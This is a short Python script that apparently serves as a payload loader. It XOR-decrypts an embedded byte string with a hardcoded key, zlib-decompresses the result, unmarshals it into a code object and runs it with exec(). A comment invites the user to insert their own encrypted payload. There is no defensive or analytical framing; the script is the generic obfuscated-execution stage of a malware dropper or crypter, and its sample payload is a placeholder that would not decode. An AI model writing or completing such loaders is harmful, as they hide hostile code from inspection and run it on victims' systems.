
import base64
import zlib
import marshal
import types

def decrypt_payload(encrypted_data, key):
    # Simple XOR decryption
    decrypted = bytearray()
    for i, byte in enumerate(encrypted_data):
        decrypted.append(byte ^ ord(key[i % len(key)]))
    return bytes(decrypted)

def execute_payload(payload_bytes):
    # Decompress and execute
    try:
        decompressed = zlib.decompress(payload_bytes)
        code_obj = marshal.loads(decompressed)
        exec(code_obj)
    except Exception as e:
        print(f"Execution error: {e}")

if __name__ == "__main__":
    # Your encrypted payload here
    encrypted_payload = b'1a041b1e3512675d463e0556'
    decryption_key = "RawrZ2024"
    
    decrypted = decrypt_payload(encrypted_payload, decryption_key)
    execute_payload(decrypted)
